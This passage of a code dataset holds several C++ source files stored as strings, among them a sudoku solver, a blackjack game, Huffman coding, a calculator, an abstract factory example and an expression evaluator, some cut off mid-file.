\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\n\t\t\tsprite->Initialize(chipGraph, ChipPixelSize, currentData[i][j]);\n\t\t\tVECTOR chipHalfOffset = VGet(-Map::ChipSize * 0.5f, -Map::ChipSize * 0.5f, 0);\t\t\t\t\t// \u30de\u30c3\u30d7\u30c1\u30c3\u30d7\u306e\u534a\u5206\u30b5\u30a4\u30ba\u5de6\u4e0b\u306b\u305a\u3089\u3059\u30aa\u30d5\u30bb\u30c3\u30c8\n\t\t\tVECTOR chipPos = VAdd(VGet(j * Map::ChipSize, (-i - 1) * Map::ChipSize, 0), chipHalfOffset);\t// \u771f\u3093\u4e2d\u30d4\u30dc\u30c3\u30c8\u306a\u306e\u3067\u30de\u30c3\u30d7\u30c1\u30c3\u30d7\u534a\u5206\u30b5\u30a4\u30ba\u305a\u3089\u3059+\u5730\u9762\u306a\u306e\u3067\u4e00\u3064\u4e0b\u306b\n\t\t\tchipPos = VAdd(chipPos, chipLeftTopPos);\n\t\t\tsprite->SetTransform(chipPos, Map::ChipSize);\n\t\t\tsprites.push_back(sprite);\n\t\t}\n\t}\n}\n\n/// <summary>\n/// \u66f4\u65b0\n/// </summary>\nvoid Map::Update()\n{\n\t// \u51e6\u7406\u306a\u3057\n}\n\n/// <summary>\n/// \u63cf\u753b\n/// </summary>\nvoid Map::Draw()\n{\n\t// \u3086\u304f\u3086\u304f\u306f\u30ab\u30e1\u30e9\u3092\u6301\u3063\u3066\u304d\u3066\u3001\u30ab\u30e1\u30e9\u7bc4\u56f2\u4ee5\u5916\u8868\u793a\u3057\u306a\u3044\u3088\u3046\u306b\n\tfor (const auto& sprite : sprites)\n\t{\n\t\tsprite->Draw();\n\t}\n}\n\n\n",
    "#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nvoid printSudoku(int arr[9][9]) {\r\n    cout << \"_________________\" << endl << endl;\r\n\r\n    for (int r = 0; r < 9; r++) {\r\n        for (int c = 0; c < 9; c++)\r\n            cout << arr[r][c] << ' ';\r\n        cout << endl;\r\n    }\r\n\r\n    cout << \"_________________\" << endl;\r\n}\r\n\r\nbool canPlace(int arr[9][9], int row, int col, int n) {\r\n    if (arr[row][col] != 0) return false;\r\n\r\n    bool status = true;\r\n    int gridx = (col / 3) * 3;\r\n    int gridy = (row / 3) * 3;\r\n    for (int i = 0; i < 9; i++) {\r\n        if (arr[row][i] == n) { status = false; break; }\r\n        if (arr[i][col] == n) { status = false; break; }\r\n        if (arr[gridy + i /3][gridx + i % 3] == n) { status = false; break; }\r\n    }\r\n    return status;\r\n}\r\n\r\nstd::vector<int> findPlacebles(int arr[9][9], int r, int c) {\r\n    vector<int> cps = {};\r\n    for (int i = 1; i <= 9; i++) {\r\n        if (canPlace(arr, r, c, i))\r\n            cps.push_back(i);\r\n    }\r\n    return cps;\r\n}\r\n\r\nvoid copyArray(int arr[9][9], int arrCopy[9][9]) {\r\n    for (int y = 0; y < 9; y++)\r\n        for (int x = 0; x < 9; x++)\r\n            arrCopy[y][x] = arr[y][x];\r\n}\r\n\r\nvoid nextEmpty(int arr[9][9], int row, int col, int& rowNext, int& colNext) {\r\n    int index = 9 * 9 + 1;\r\n    for (int i = row * 9 + col + 1; i < 9 * 9; i++) {\r\n        if (arr[i / 9][i % 9] == 0) {\r\n            index = i;\r\n            break;\r\n        }\r\n    }\r\n    rowNext = index / 9;\r\n    colNext = index % 9;\r\n}\r\n\r\nbool solveSudoku(int arr[9][9], int row, int col) {\r\n    if (row > 8) return true;\r\n\r\n    if (arr[row][col] != 0) {\r\n        int rowNext;\r\n        int colNext;\r\n        nextEmpty(arr, row, col, rowNext, colNext);\r\n        return solveSudoku(arr, rowNext, colNext);\r\n    }\r\n\r\n    vector<int> placeables = findPlacebles(arr, row, col);\r\n    if (placeables.size() == 0) return false;\r\n\r\n    bool status = false;\r\n    for (int i = 0; i < placeables.size(); i++) {\r\n        int n = placeables[i];\r\n        int arrCopy[9][9];\r\n        copyArray(arr, arrCopy);\r\n        arrCopy[row][col] = n;\r\n        int rowNext;\r\n        int colNext;\r\n        nextEmpty(arrCopy, row, col, rowNext, colNext);\r\n        if (solveSudoku(arrCopy, rowNext, colNext)) {\r\n            copyArray(arrCopy, arr);\r\n            status = true;\r\n            break;\r\n        }\r\n\r\n    }\r\n\r\n    return status;\r\n}\r\n\r\nint main()\r\n{\r\n    int board[9][9] = {\r\n        {5,3,0,0,7,0,0,0,0},\r\n        {6,0,0,1,9,5,0,0,0},\r\n        {0,9,8,0,0,0,0,6,0},\r\n        {8,0,0,0,6,0,0,0,3},\r\n        {4,0,0,8,0,3,0,0,1},\r\n        {7,0,0,0,2,0,0,0,6},\r\n        {0,6,0,0,0,0,2,8,0},\r\n        {0,0,0,4,1,9,0,0,5},\r\n        {0,0,0,0,8,0,0,7,9}\r\n    };\r\n\r\n    printSudoku(board);\r\n    solveSudoku(board, 0, 0);\r\n    printSudoku(board);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include<iostream>\r\n#include<string.h>\r\n#include<ctime>\r\n#include<windows.h>\r\n\r\nusing namespace std;\r\n\r\nint baraja[4][13] = {};\r\nint carta[2] = {};\r\nint manoCrupier = 0, manoJugador = 0, valorAs = 0;\r\nbool hayAs = false;\r\n\r\nvoid generarBaraja();\r\nvoid generarCartas();\r\nvoid imprimirCartas();\r\nvoid primerTurno();\r\n\r\nint main()\r\n{\r\n    int valorAs = 0, plantarse = 0;\r\n    bool terminar = true, turnoJugador = true, ronda = true;\r\n\r\n    generarBaraja();\r\n    primerTurno();\r\n    do\r\n    {\r\n        if(turnoJugador == true)\r\n        {\r\n            do\r\n            {\r\n                cout << \"\u00bfPides o te plantas? 1)Pedir 2)Plantarse\" << endl;\r\n                cin >> plantarse;\r\n                switch(plantarse)\r\n                {\r\n                case 1:\r\n                    generarCartas();\r\n                    if(carta[1]+1 > 10)\r\n                    {\r\n                        manoJugador += 10;\r\n                    }\r\n                    else if(carta[1]+1 == 1)\r\n                    {\r\n                        cout << \"Escoge el valor del As: 1 u 11\";\r\n                        cin >> valorAs;\r\n                        switch(valorAs)\r\n                        {\r\n                        case 1:\r\n                            manoJugador += 1;\r\n                            cout << \"Total: \" << manoJugador << endl;\r\n                            break;\r\n                        case 11:\r\n                            manoJugador += 11;\r\n                            cout << \"Total: \" << manoJugador << endl;\r\n                            break;\r\n                        }\r\n                    }\r\n                    else\r\n                    {\r\n                        manoJugador += carta[1]+1;\r\n                    }\r\n                    imprimirCartas();\r\n                    cout << \"Total: \" << manoJugador << endl;\r\n                    break;\r\n                case 2:\r\n                     turnoJugador = false;\r\n                }\r\n            }\r\n            while(turnoJugador == true);\r\n        }\r\n\r\n        if(turnoJugador == false)\r\n        {\r\n            generarCartas();\r\n            if(carta[1]+1 > 10)\r\n            {\r\n                manoCrupier += 10;\r\n            }\r\n            else if(carta[1]+1 == 1)\r\n            {\r\n                if((manoCrupier + 11) < 21)\r\n                {\r\n                    manoCrupier += 11;\r\n                }\r\n                else if((manoCrupier + 11) == 21)\r\n                {\r\n                    cout << \"BlackJack\" << endl;\r\n                    ronda = false;\r\n                }\r\n                else\r\n                {\r\n                    cout << \"El Crupier se paso de 21\" << endl;\r\n                    ronda = false;\r\n                }\r\n            }\r\n            else\r\n            {\r\n                manoCrupier += carta[1]+1;\r\n            }\r\n            imprimirCartas();\r\n        }\r\n    }\r\n    while(ronda == true);\r\n}\r\n\r\nvoid generarBaraja()\r\n{\r\n    for(int i = 0; i < 4; i++)\r\n    {\r\n        for(int j = 0; j < 13; j++)\r\n        {\r\n            baraja[i][j] = 1;\r\n        }\r\n    }\r\n}\r\n\r\nvoid generarCartas()\r\n{\r\n    srand(time(0));\r\n    int x = 0, y = 0;\r\n    bool seguir = true;\r\n\r\n    do\r\n    {\r\n        x = rand()% 13;\r\n        y = rand()% 4;\r\n\r\n        if(baraja[y][x] != 0)\r\n        {\r\n            carta[0] = y;\r\n            carta[1] = x;\r\n            baraja[y][x] -=1;\r\n            seguir = false;\r\n        }\r\n    }\r\n    while(seguir == true);\r\n}\r\n\r\nvoid imprimirCartas()\r\n{\r\n    if(carta[1]+1 == 1)\r\n    {\r\n        cout << \"Ace\";\r\n    }\r\n    else if(carta[1]+1 > 10)\r\n    {\r\n        switch(carta[1]+1)\r\n        {\r\n        case 11:\r\n            cout << \"Jack\";\r\n            break;\r\n        case 12:\r\n            cout << \"Queen\";\r\n            break;\r\n        case 13:\r\n            cout << \"King\";\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << carta[1]+1;\r\n    }\r\n\r\n    switch(carta[0]+1)\r\n    {\r\n    case 1:\r\n        SetConsoleOutputCP(CP_UTF8);\r\n        printf(\"\u2665\\n\");\r\n        break;\r\n    case 2:\r\n        SetConsoleOutputCP(CP_UTF8);\r\n        printf(\"\u2666\\n\");\r\n        break;\r\n    case 3:\r\n        SetConsoleOutputCP(CP_UTF8);\r\n        printf(\"\u2663\\n\");\r\n        break;\r\n    case 4:\r\n        SetConsoleOutputCP(CP_UTF8);\r\n        printf(\"\u2660\\n\");\r\n        break;\r\n    }\r\n}\r\n\r\nvoid primerTurno()\r\n{\r\n    cout << \"Crupier: \" << endl;\r\n    generarCartas();\r\n    manoCrupier += carta[1]+1;\r\n    cout << \"???, \";\r\n    generarCartas();\r\n    manoCrupier += carta[1]+1;\r\n    imprimirCartas();\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << endl;\r\n    cout << \"Jugador: \" << endl;\r\n    generarCartas();\r\n    if(carta[1]+1 > 10)\r\n    {\r\n        manoJugador += 10;\r\n    }\r\n    else if(carta[1]+1 == 1)\r\n    {\r\n        hayAs = true;\r\n    }\r\n    else\r\n    {\r\n        manoJugador += carta[1]+1;\r\n    }\r\n    imprimirCartas();\r\n    generarCartas();\r\n    if(hayAs == true)\r\n    {\r\n        im",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct heapnode{\r\n    char item;\r\n    int freq;\r\n    struct heapnode *left,*right;\r\n}*root;\r\nstruct heap{\r\n    int size;\r\n    int capacity;\r\n    struct heapnode **array;\r\n};\r\nvoid printarray(int arr[],int n){\r\n    int i;\r\n    for (i = 0; i < n; ++i)\r\n        printf(\"%d\", arr[i]);\r\n\r\n    printf(\"\\n\");\r\n}\r\nint isLeaf(struct heapnode *root) {\r\n  return !(root->left) && !(root->right);\r\n}\r\nvoid printcode(struct heapnode *root,int arr[],int top){\r\n    if (root->left) {\r\n        arr[top] = 0;\r\n        printcode(root->left, arr, top + 1);\r\n    }\r\n    if (root->right) {\r\n        arr[top] = 1;\r\n        printcode(root->right, arr, top + 1);\r\n    }\r\n    if (isLeaf(root)) {\r\n        printf(\"  %c   | \", root->item);\r\n        printarray(arr, top);\r\n    }\r\n    \r\n}\r\nvoid buildHtree(char pchar[],int pfreq[],int size){\r\n\r\n    struct heap *heap=(struct heap*)malloc(sizeof(struct heap));\r\n    heap->capacity=size;\r\n    heap->array=(struct heapnode**)malloc(heap->capacity*sizeof(struct heapnode*));\r\n    heap->size=size-1;\r\n    for(int i=0;i<size;i++){\r\n        heap->array[i]=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n        heap->array[i]->left=heap->array[i]->right=NULL;\r\n        heap->array[i]->item=pchar[i];\r\n        heap->array[i]->freq=pfreq[i];\r\n    }\r\n    while(heap->size>0){\r\n        if(root==NULL){\r\n            root=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n            (root->left)=(heap->array[(heap->size)--]);\r\n            (root->right)=(heap->array[(heap->size)--]);\r\n            root->item='$';\r\n            root->freq=root->left->freq+root->right->freq;\r\n        }\r\n        else{\r\n            struct heapnode *temp;\r\n            temp=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n            if(root->freq+(heap->array[heap->size]->freq) < (heap->array[heap->size]->freq+heap->array[heap->size-1]->freq)){\r\n                if(root->freq < (heap->array[heap->size]->freq)){\r\n                    temp->left=root;\r\n                    temp->right=heap->array[(heap->size)--];\r\n                    temp->item='$';\r\n                    temp->freq=temp->left->freq+temp->right->freq;\r\n                    root=temp;\r\n                }\r\n                else{\r\n                    temp->right=root;\r\n                    temp->left=heap->array[(heap->size)--];\r\n                    temp->item='$';\r\n                    temp->freq=temp->left->freq+temp->right->freq;\r\n                    root=temp;\r\n                }\r\n            }\r\n            else{\r\n                (temp->left)=(heap->array[(heap->size)--]);\r\n                (temp->right)=(heap->array[(heap->size)--]);\r\n                temp->item='$';\r\n                temp->freq=temp->left->freq+temp->right->freq;\r\n                struct heapnode *temp1;\r\n                temp1=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n                if(root->freq < temp->freq){\r\n                    temp1->left=root;\r\n                    temp1->right=temp;\r\n                    temp1->item='$';\r\n                    temp1->freq=root->freq+temp->freq;\r\n                    root=temp1;\r\n                }\r\n                else{\r\n                    temp1->right=root;\r\n                    temp1->left=temp;\r\n                    temp1->item='$';\r\n                    temp1->freq=root->freq+temp->freq;\r\n                    root=temp1;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    if(heap->size==0){\r\n        struct heapnode *temp;\r\n        temp=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n        if(root==NULL){\r\n            root=(struct heapnode*)malloc(sizeof(struct heapnode));\r\n            (root->left)=(heap->array[(heap->size)--]);\r\n            root->item='$';\r\n            root->freq=root->left->freq;\r\n            root->right=NULL;\r\n        }\r\n        else{\r\n\r\n            if(root->freq < heap->array[heap->size]->freq){\r\n                temp->left=root;\r\n                temp->right=heap->array[heap->size];\r\n                temp->freq=root->freq+heap->array[heap->size]->freq;\r\n                temp->item='$';\r\n                root=temp;\r\n            }\r\n            else{\r\n                temp->right=root;\r\n                temp->left=heap->array[heap->size];\r\n                temp->freq=root->freq+heap->array[heap->size]->freq;\r\n                temp->item='$';\r\n                root=temp;\r\n            }\r\n        }\r\n    }\r\n    int arr[54],top=0;\r\n    printcode(root,arr,top);\r\n    return;\r\n}\r\n\r\n\r\nint main(){\r\n    int freq[54]={0};\r\n    string in;\r\n    cout<<\"Enter the message you want to send:\"<<endl;\r\n    cout<<\"NOTE:The message can contain space and full stop also \"<<endl;\r\n    getline(cin,in);\r\n\r\n    for(int i=0;i<in.size();i++){\r\n        if(in[i]>='A'&&in[i]<='Z'){\r\n            freq[(in[i]-65)]++;\r\n        }\r\n        else if(in[i]>='a'&&in[i]<='z'){\r\n            freq[(in[i]-71)]++;\r\n        }\r\n        else if(in[i]==32){\r\n            freq[52]++;\r\n        }\r\n        else{\r\n            freq[53]++;\r\n        }\r\n    }\r\n    cha",
    "\ufeff#include <iostream>\n\nclass Calculator\n{\npublic:\n    double num1;\n    double num2;\n    double add()\n    {\n        return num1 + num2;\n    }\n    double multiply()\n    {\n        return num1 * num2;\n    }\n    double subtract_1_2()\n    {\n        return num1 - num2;\n    }\n    double subtract_2_1()\n    {\n        return num2 - num1;\n    }\n    double divide_1_2()\n    {\n        return num1 / num2;\n    }\n    double divide_2_1()\n    {\n        return num2 / num1;\n    }\n    bool set_num1(double num1)\n    {\n        do\n        {\n            std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 num1: \";\n            std::cin >> num1;\n            this->num1 = num1;\n            if (num1 != 0)\n            {\n                num1 = num1;\n                return true;\n            }\n            else\n            {\n                std::cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u0432\u043e\u0434!\\n\";\n            }\n        } while (!num1);\n    }\n    bool set_num2(double num2)\n    {\n        do {\n            std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 num2: \";\n            std::cin >> num2;\n            this->num2 = num2;\n            if (num2 != 0)\n            {\n                num2 = num2;\n                return true;\n            }\n            else\n            {\n                std::cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u0432\u043e\u0434!\\n\";\n            }\n        } while (!num2);\n\n    }\n};\nint main(int argc, char** argv)\n{\n    setlocale(LC_ALL, \"Russian\");\n    Calculator calculator{};\n    calculator.set_num1(calculator.num1);\n    calculator.set_num2(calculator.num2);\n    std::cout << \"num1 + num2 = \" << calculator.add() << std::endl;\n    std::cout << \"num1 - num2 = \" << calculator.subtract_1_2() << std::endl;\n    std::cout << \"num2 - num1 = \" << calculator.subtract_2_1() << std::endl;\n    std::cout << \"num1 * num2 = \" << calculator.multiply() << std::endl;\n    std::cout << \"num1 / num2 = \" << calculator.divide_1_2() << std::endl;\n    std::cout << \"num2 / num1 = \" << calculator.divide_2_1() << std::endl;\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\n\nusing namespace std;\n\n/*\n\u0410\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0444\u0430\u0431\u0440\u0438\u043a\u0430 - \u043f\u043e\u0440\u043e\u0436\u0434\u0430\u044e\u0449\u0438\u0439 \u043f\u0430\u0442\u0442\u0435\u0440\u043d \u043f\u0440\u043e\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f,\n\u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0445 \u0438\u043b\u0438 \u0432\u0437\u0430\u0438\u043c\u043e\u0437\u0430\u0432\u0438\u0441\u0438\u043c\u044b\u0445 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432,\n\u043d\u0435 \u0441\u043f\u0435\u0446\u0438\u0444\u0438\u0446\u0438\u0440\u0443\u044f \u0438\u0445 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0445 \u043a\u043b\u0430\u0441\u0441\u043e\u0432.\n\n\u041f\u0440\u0438\u043c\u0435\u043d\u0438\u043c\u043e\u0441\u0442\u044c\n- \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u043d\u0435 \u0434\u043e\u043b\u0436\u043d\u0430 \u0437\u0430\u0432\u0438\u0441\u0435\u0442\u044c \u043e\u0442 \u0442\u043e\u0433\u043e, \u043a\u0430\u043a \u0441\u043e\u0437\u0434\u0430\u044e\u0442\u0441\u044f, \u043a\u043e\u043c\u043f\u043e\u043d\u0443\u044e\u0442\u0441\u044f \u0438 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u0432 \u043d\u0435\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b;\n- \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u0432 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432\u043e \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0432\u043c\u0435\u0441\u0442\u0435 \u0438 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0438\u0442\u044c \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u044d\u0442\u043e\u0433\u043e \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f;\n- \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0434\u043e\u043b\u0436\u043d\u0430 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u043e\u0434\u043d\u0438\u043c \u0438\u0437 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u0441\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0445 \u0435\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432;\n\n\u041f\u0430\u0442\u0442\u0435\u0440\u043d \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0444\u0430\u0431\u0440\u0438\u043a\u0430 \u043e\u0431\u043b\u0430\u0434\u0430\u0435\u0442 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u043c\u0438 \u043f\u043b\u044e\u0441\u0430\u043c\u0438 \u0438 \u043c\u0438\u043d\u0443\u0441\u0430\u043c\u0438:\n * \u0438\u0437\u043e\u043b\u0438\u0440\u0443\u0435\u0442 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0435 \u043a\u043b\u0430\u0441\u0441\u044b.\n * \u0443\u043f\u0440\u043e\u0449\u0430\u0435\u0442 \u0437\u0430\u043c\u0435\u043d\u0443 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u043e\u0432.\n * \u0433\u0430\u0440\u0430\u043d\u0442\u0438\u0440\u0443\u0435\u0442 \u0441\u043e\u0447\u0435\u0442\u0430\u0435\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u043e\u0432.\n*/\n\nclass Herbivore {\npublic:\n    virtual string Name() = 0;\n    virtual int GetWeight() = 0;\n    virtual void EatVegan() = 0;\n    virtual bool IsAlive() = 0;\n    virtual void Alive(bool alive) = 0;\n    virtual ~Herbivore() {}\n};\n\nclass Predator {\npublic:\n    virtual string Name() = 0;\n    virtual int Power() = 0;\n    virtual void EatMeat(Herbivore* herbivore) = 0;\n    virtual ~Predator() {}\n};\n\nclass Wildebeest : public Herbivore {\nprivate:\n    int weight;\n    bool alive;\npublic:\n    Wildebeest() : weight(300), alive(true) {}\n\n    string Name() override {\n        return \"Wildebeest\";\n    }\n    int GetWeight() override {\n        return weight;\n    }\n    void EatVegan() override {\n        weight += 10;\n    }\n    bool IsAlive() override {\n        return alive;\n    }\n    void Alive(bool Alive) override {\n        alive = Alive;\n    }\n};\n\nclass Bison : public Herbivore {\nprivate:\n    int weight;\n    bool alive;\npublic:\n    Bison() : weight(500), alive(true) {}\n\n    string Name() override {\n        return \"Bison\";\n    }\n    int GetWeight() override {\n        return weight;\n    }\n    void EatVegan() override {\n        weight += 10;\n    }\n    bool IsAlive() override {\n        return alive;\n    }\n    void Alive(bool Alive) override {\n        alive = Alive;\n    }\n};\n\nclass Elk : public Herbivore {\nprivate:\n    int weight;\n    bool alive;\npublic:\n    Elk() : weight(400), alive(true) {}\n\n    string Name() override {\n        return \"Elk\";\n    }\n    int GetWeight() override {\n        return weight;\n    }\n    void EatVegan() override {\n        weight += 10;\n    }\n    bool IsAlive() override {\n        return alive;\n    }\n    void Alive(bool Alive) override {\n        alive = Alive;\n    }\n};\n\nclass Lion : public Predator {\nprivate:\n    int power;\npublic:\n    Lion() : power(400) {}\n\n    string Name() override {\n        return \"Lion\";\n    }\n    int Power() override {\n        return power;\n    }\n    void EatMeat(Herbivore* herbivore) override {\n        if (power > herbivore->GetWeight()) {\n            power += 10;\n            herbivore->Alive(false);\n            cout << \"Lion eats \" << herbivore->Name() << \" and gains power\\n\";\n        }\n        else {\n            power -= 10;\n            cout << \"Lion fails to eat \" << herbivore->Name() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Wolf : public Predator {\nprivate:\n    int power;\npublic:\n    Wolf() : power(400) {}\n\n    string Name() override {\n        return \"Wolf\";\n    }\n    int Power() override {\n        return power;\n    }\n    void EatMeat(Herbivore* herbivore) override {\n        if (power > herbivore->GetWeight()) {\n            power += 10;\n            herbivore->Alive(false);\n            cout << \"Wolf eats \" << herbivore->Name() << \" and gains power\\n\";\n        }\n        else {\n            power -= 10;\n            cout << \"Wolf fails to eat \" << herbivore->Name() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Tiger : public Predator {\nprivate:\n    int power;\npublic:\n    Tiger() : power(450) {}\n\n    string Name() override {\n        return \"Tiger\";\n    }\n    int Power() override {\n        return power;\n    }\n    void EatMeat(Herbivore* herbivore) override {\n        if (power > herbivore->GetWeight()) {\n            power += 10;\n            herbivore->Alive(false);\n            cout << \"Tiger eats \" << herbivore->Name() << \" and gains power\\n\";\n        }\n        else {\n            power -= 10;\n            cout << \"Tiger fails to eat \" << herbivore->Name() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Continent {\npublic:\n    virtual Herbivore* CreateHerbivore() = 0;\n    virtual Predator* CreateCarnivore() = 0;\n    virtual ~Continent() {}\n};\n\nclass Africa : public Continent {\npublic:\n    Herbivore* CreateHerbivore() override {\n        return new Wildebeest();\n    }\n    Predator* CreateCarnivore() override {\n        return new Lion();\n    }\n};\n\nclass NorthAmerica : public Continent {\npublic:\n    Herbivore* CreateHerbivore() override {\n        return new Bison();\n    }\n    Predator* CreateCarnivore() override {\n        return new Wolf();\n    }\n};\n\nclass Eurasia : public Continent {\npublic:\n    Herbivore* CreateHerbivore() override {\n        return new Elk();\n    }\n    Predator* CreateCarnivore() override {\n     ",
    "class Solution {\npublic:\n    bool search(vector<int>& nums, int target) {\n         int low = 0 ;\n        int high = nums.size() - 1;\n        \n        while(low <= high){\n            int mid = low + (high - low)/2;\n            if(nums[mid] == target){\n                return true;\n            }\n            \n            if(nums[low] == nums[mid] && nums[mid] == nums[high]){\n                low = low + 1 ;\n                high = high -1 ;\n                continue;\n                \n            }\n            \n            if(nums[low] <= nums[mid]){\n                if(nums[low] <= target && target <= nums[mid]){\n                    high = mid - 1 ;\n                    \n                }else{\n                    low = mid +1;\n                }\n            }else{\n                if(nums[mid] <= target && target <= nums[high]){\n                    low = mid + 1;\n                }else{\n                    high = mid - 1 ;\n                }\n            }\n        }\n        \n        return  false;\n    }\n};",
    "\n#include \"Gradebook.h\"\n#include <iostream>\n\n\nint main()\n{\n    std::cout << std::endl << std::endl;\n    std::cout << \"--------------------\" << std::endl;\n    std::cout << \"-- Opgave 2  test --\" << std::endl;\n    std::cout << \"--------------------\" << std::endl << std::endl;\n\n    Gradebook gBook;\n\n    std::string activityCPP1 = \"2.5\\n\";\n    std::string activityCPP2 = \"2.5\\n\";\n    std::string activityOOP1 = \"5\\n\";\n    std::string examCPP = \"45\\n\";\n    std::string examOOP = \"45\\n\";\n    activityCPP1 += \"prhol02 100\\njejen20 80\\nninie20 20\\njajol20 50\\n\\n\";\n    activityCPP2 += \"prhol02 100\\njejen20 80\\nninie20 50\\njajol20 35\\njejoe20 10\\n\";\n    activityOOP1 += \"prhol02 100\\njejen20 80\\n\\n\\njajol20 17\\njejoe20 50\\n\";\n    examCPP      += \"prhol02 100\\njejen20 100\\nninie20 90\\njajol20 80\\njejoe20 70\\n\";\n    examOOP      += \"prhol02 100\\njejen20 100\\nninie20 80\\njajol20 30\\njejoe20 45\\n\";\n\n    std::stringstream saCPP1(activityCPP1);\n    std::stringstream saCPP2(activityCPP2);\n    std::stringstream saOOP1(activityOOP1);\n    std::stringstream seCPP(examCPP);\n    std::stringstream seOOP(examOOP);\n    gBook.readResults(saCPP1);\n    gBook.readResults(saCPP2);\n    gBook.readResults(saOOP1);\n    gBook.readResults(seCPP);\n    gBook.readResults(seOOP);\n\n    std::stringstream ssoutput;\n    gBook.printResults(ssoutput);\n    std::cout << \"Resultater printet i stream\" << std::endl;\n    std::cout << ssoutput.str() << std::endl;\n    std::cout << \"Resultater printet p\u00e5 sk\u00e6rm\" << std::endl;\n    return 0;\n}\n",
    "#include <iostream>\r\n#include\"stacktype.h\"\r\n\r\nusing namespace std;\r\n\r\n\r\n// Helper functions\r\n\r\nbool is_operator(char ch) {\r\n    return ch == '+' || ch == '-' || ch == '*' || ch == '/';\r\n}\r\n\r\nint precedence(char op) {\r\n    if (op == '+' || op == '-')\r\n        return 1;\r\n    if (op == '*' || op == '/')\r\n        return 2;\r\n    return 0;\r\n}\r\n\r\nint apply_operator(int a, int b, char op) {\r\n    switch(op) {\r\n        case '+': return a + b;\r\n        case '-': return a - b;\r\n        case '*': return a * b;\r\n        case '/':\r\n            if (b == 0) throw runtime_error(\"Division by zero\");\r\n            return a / b;\r\n        default: return 0;\r\n    }\r\n}\r\n\r\nstring infix_to_postfix(const string &infix) {\r\n    StackType <char> s;\r\n    string postfix = \"\";\r\n\r\n    for (char ch : infix) {\r\n        if (isdigit(ch)) {\r\n            postfix += ch;\r\n        } else if (is_operator(ch)) {\r\n            while (!s.IsEmpty() && precedence(s.Top()) >= precedence(ch)) {\r\n                postfix += s.Top();\r\n                s.Pop();\r\n            }\r\n            s.Push(ch);\r\n        } else if (ch == '(') {\r\n            s.Push(ch);\r\n        } else if (ch == ')') {\r\n            while (!s.IsEmpty() && s.Top() != '(') {\r\n                postfix += s.Top();\r\n                s.Pop();\r\n            }\r\n            if (!s.IsEmpty() && s.Top() == '(') {\r\n                s.Pop();\r\n            }\r\n        }\r\n    }\r\n    while (!s.IsEmpty()) {\r\n        postfix += s.Top();\r\n        s.Pop();\r\n    }\r\n\r\n    return postfix;\r\n}\r\n\r\nint evaluate_postfix(const string &postfix) {\r\n    StackType<int> s;\r\n\r\n    for (char ch : postfix) {\r\n        if (isdigit(ch)) {\r\n            s.Push(ch - '0');\r\n        } else if (is_operator(ch)) {\r\n            int b 